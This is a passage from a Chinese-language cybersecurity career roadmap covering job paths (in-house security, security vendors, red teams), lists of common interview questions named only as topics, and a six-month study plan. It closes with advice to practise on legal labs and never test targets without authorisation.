  - 岗位：安全工程师、安全运维、蓝队、安全运营（SOC）
  - 工作：管公司自己的设备/系统/漏洞/应急，推动整改
  - 特点：稳定、节奏相对平缓、接触面广（从网络到主机到应用）、一线城市大厂需求大
  - 适合：想长期深耕、喜欢"守"、能推动跨部门整改的人
- 乙方（安全厂商/服务商）
  - 岗位：渗透测试工程师、安全服务工程师、等保测评师、售前/售后
  - 工作：帮客户做渗透、漏扫、应急、等保整改
  - 特点：项目制、出差多、见识多（不同客户不同环境）、技能成长快
  - 适合：想快速积累经验、能出差、喜欢项目制的人
- 红队/攻防研究
  - 岗位：红队、安全研究员、漏洞挖掘、二进制安全
  - 工作：专项攻击、0day 挖掘、应急溯源反制
  - 特点：门槛最高、薪资天花板高、需要持续研究
  - 适合：天赋+热爱+能持续学习的人
- 新兴方向（值得关注）
  - 云安全工程师（云原生你天然有优势）
  - 数据安全（DSP/隐私计算）
  - AI 安全（大模型安全）
  - 工控安全（蓝海，见第五阶段）
- 入行路径建议（从易到难）
  - 第一步：乙方安全服务（渗透/等保）或甲方安全运维——门槛最低、需求大
  - 第二步：积累 2-3 年，转甲方安全工程师或专项方向
  - 或：直接甲方安全运营（SOC）+ 护网经历入行

**④ 命令/代码示例**
自我定位检查表（面试前问自己）：
```text
1. 我想做"守"（蓝队/安全运维）还是"攻"（渗透/红队）？
2. 我能接受出差/值班吗？（乙方 vs 甲方的重要差异）
3. 我的技术栈更偏：网络？Web？云原生？还是二进制？
4. 我 3 年后的目标岗位是什么？现在这份工作能否通向它？
```

**⑤ 实战任务**
- 在招聘网站搜索"安全工程师/渗透测试/安全运维"，各看 5 个 JD，记录共性要求（技能、经验、证书）
- 根据 JD 共性，把"你需要补的技能"列成清单，对照本路线图逐项打勾
- 选出 1 个目标岗位，写"我距离这个岗位还差什么"的分析

**⑥ 面试考点**
- 问：甲方和乙方安全岗位的区别？
- 答：甲方守自家系统（稳定、面广、重运营整改），乙方服务客户（项目制、出差、经验增长快）；入门门槛上安全服务/安全运维更低
- 问：安全行业哪些方向前景好？
- 答：云安全、数据安全、AI 安全、工控安全是上升期方向；蓝队/安全运营需求持续增长，红队门槛高但价值高

### 知识点 3：面试高频题（最后的冲刺）

**① 一句话本质**
面试题 = 把前面所有知识浓缩成"60 个高频问答"——安全面试套路固定，把高频题练熟、练透、练出"自己的表达"，通过率直接翻倍。

**② 生活类比**
高考前刷真题：题型就那些（基础概念、漏洞原理、实战场景、应急处理），把真题刷到"看到题目条件反射"——面试就是你背过题库的"模拟考"。

**③ 原理详解**
- 基础概念必背（10 个）
  - OWASP Top 10 有哪些？/ SQL 注入原理与防御 / XSS 三种类型区别
  - CSRF 与 XSS 区别 / SSRF 原理 / 文件上传绕过思路
  - 对称与非对称加密区别 / 加盐哈希为什么安全 / 数字签名流程
  - HTTPS 握手过程 / 密码存储最佳实践
- Web 专项必背（10 个）
  - SQL 注入绕过（空格/关键字/编码）思路
  - 布尔盲注 vs 时间盲注原理
  - 反序列化 RCE 成因（Fastjson/Log4j）
  - 越权测试怎么测 / 水平垂直越权区别
  - 命令注入与代码执行区别
  - WAF 绕过思路 / 一句话木马是什么
  - 登录功能测试要点（爆破/逻辑/会话）
- 实战场景必背（10 个）
  - 拿到 shell 后第一步做什么
  - Linux 提权思路 / sudo -l 怎么看
  - 服务器被入侵怎么处置（应急流程）
  - 挖矿木马排查步骤
  - 日志怎么看攻击 / 封 IP 命令
  - 信息收集完整流程
  - 内网横向怎么打 / 为什么需要代理
  - nmap 常用参数及用途
- 安全运维/蓝队必背（10 个）
  - 等保 2.0 流程 / 二级三级区别
  - WAF vs IDS vs IPS 区别
  - 基线加固常用项
  - 日志留存要求 / 怎么防日志被删
  - DDoS 应急处理 / 勒索病毒处置
  - 堡垒机是什么 / 作用
- 怎么练面试题（方法）
  - 每题自己先说一遍（用生活类比+流程化表达，别背书面语）
  - 对照本路线图"面试考点"逐题过
  - 模拟面试：找朋友/录音，练"临场组织语言"
  - 答不出来的题记下来，回去补知识+写进笔记

**④ 命令/代码示例**
面试模拟（自测 5 题，先口答再看答案）：
```text
Q1. 请讲一下 SQL 注入的原理和防御？
Q2. 拿到一个内网服务器 shell，接下来做什么？
Q3. 服务器 CPU 飙高、怀疑被挖矿，怎么排查？
Q4. WAF、IDS、IPS 有什么区别？
Q5. 等保 2.0 的流程是什么？
（答案分别在：第二阶段知识点 3 / 第三阶段知识点 5 / 第四阶段知识点 3 / 第四阶段知识点 1 / 第四阶段知识点 5）
```

**⑤ 实战任务**
- 从本路线图所有"面试考点"中挑 30 题，全部用自己的话写一遍答案（存成一个面试准备文档）
- 录一段 5 分钟"模拟面试"（随机抽 5 题口答），回听找问题
- 参加 1-2 次真实面试练手（哪怕不打算去），把被问到的问题全部复盘记下

**⑥ 面试考点**
- 问：面试官问"你还有什么想问的"怎么答？
- 答：问团队做什么（攻防/运维/研发）、团队用哪些工具、漏洞发现后流程、职业成长路径——显示你的专业度和上进心，别只问薪资
- 问：安全面试最容易挂在哪？
- 答：答"精通"却说不深（穿帮）、实战场景题没思路（说明没练过）、表达散乱——对策：只写真实水平+刷场景题+结构化表达

## 详细教学版总结（学习路径与每日安排）

### 学习路径回顾（8 个阶段怎么串起来）

1. 第〇阶段（认知）：先知道安全是干什么的、有什么岗位、什么能做什么不能做
2. 第一阶段（地基）：网络 + Linux + Python，这是所有安全工作的"通用语言"
3. 第二阶段（核心）：OWASP 十大漏洞原理 + 密码学 + 认证，这是渗透和面试的"必修课"
4. 第三阶段（攻防）：把原理变成工具和手法，信息收集 → 打点 → 提权 → 内网一条链
5. 第四阶段（防护）：安全设备 + 日志 + 应急 + 合规，这是蓝队/安全运维的日常工作
6. 第五阶段（专项）：根据兴趣选方向深挖（云安全/移动/二进制/代码审计）
7. 第六阶段（实战）：靶场/CTF/护网/SRC 把能力变成履历
8. 第七阶段（求职）：简历 + 岗位 + 面试题，临门一脚

### 建议的学习节奏（以 6 个月为例）

- 第 1-2 个月：第〇 + 一 + 二阶段（理论基础）
  - 每天 2-3 小时：网络/Linux 巩固 + 每天 1 个漏洞原理 + 动手靶场
- 第 3-4 个月：第三 + 四阶段（攻防 + 防护）
  - 每天 3 小时：打靶场（DVWA/sqli-labs）+ 学工具（Burp/nmap/sqlmap）+ 读日志练应急
- 第 5-6 个月：第五 + 六 + 七阶段（专项 + 实战 + 求职）
  - 每周：2 次 CTF 刷题 + 1 篇博客输出
  - 投简历 + 面试复盘 + 参加护网/SRC 攒实战

### 给新人的 5 条忠告

1. 别只记答案，每个漏洞都要"亲手打一遍、亲自修一遍"——动手 > 听课
2. 打靶场永远合法：DVWA、sqli-labs、HTB 是你最好的老师，练到吐也要练
3. 笔记是你的资产：把每个知识点写成自己的话（就像本路线图），面试前就是你的复习库
4. 圈子很重要：加安全社群、看大佬博客、参加比赛，信息差就是机会差
5. 保持红线意识：只打授权的目标，未授权测试是犯罪——技术要学，底线更要守
